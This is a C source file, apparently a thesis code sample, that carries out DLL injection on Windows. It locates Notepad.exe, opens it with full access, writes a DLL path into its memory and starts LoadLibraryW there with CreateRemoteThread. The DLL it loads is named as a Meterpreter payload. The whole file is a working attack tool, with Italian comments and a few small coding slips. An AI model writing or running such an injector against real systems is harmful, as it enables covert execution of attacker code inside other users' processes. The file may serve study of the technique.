#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>


int GetRemoteProcessHandle(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, (const char*)pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
	  printf("[+] Found Process: %s\n", pe.szExeFile);
	  printf("[+] Process ID: %d\n", pid);
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

void inject_dll(HANDLE hProcess, LPWSTR DllName){
    //prendo indirizzo della funzione LoadLibraryW
    LPVOID LoadLibraryWAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
    if(LoadLibraryWAddr == NULL){
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return;
    }
	printf("[+] LoadLibraryW Address: %p\n", LoadLibraryWAddr);
    //alloco memoria nel processo per eseguire LoadLibraryW con argomento DllName
	DWORD DllNameSize = lstrlenW(DllName) * sizeof(WCHAR);
    LPVOID DllNameAddr = VirtualAllocEx(hProcess, NULL, DllNameSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if(DllNameAddr == NULL){
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return;
    }
	printf("[+] DllName Address: %p\n", DllNameAddr);

    //scrivo il nome della dll nel processo
	SIZE_T BytesWritten;
    if(!WriteProcessMemory(hProcess, DllNameAddr, DllName, DllNameSize, &BytesWritten) || BytesWritten != DllNameSize){
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return;
    }
	printf("[+] DllName Written, Bytes Written: %d\n", BytesWritten);
    //starto un thread nel processo per eseguire LoadLibraryW con argomento DllName
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL,LoadLibraryWAddr, DllNameAddr, NULL, NULL);

    if(hThread == NULL){
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        return;
    }
	//WaitForSingleObject(hThread, INFINITE);
	if(hThread != NULL){
		CloseHandle(hThread);
	}
	printf("[+] Thread Created\n");
    return;
}


int main(){
    HANDLE* hProcess;
    DWORD dwProcessId;
    LPWSTR DllName = L"C:\\Users\\jakyd\\Desktop\\tesi\\code_samples\\dll_injections\\meterpreter_dll.dll";
    const char* ProcessName = "Notepad.exe";

    dwProcessId = GetRemoteProcessHandle(ProcessName);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if(hProcess == NULL){
		printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
		return ;
	}

    printf("[+] Process ID: %d\n", dwProcessId);

    inject_dll(hProcess, DllName);
}
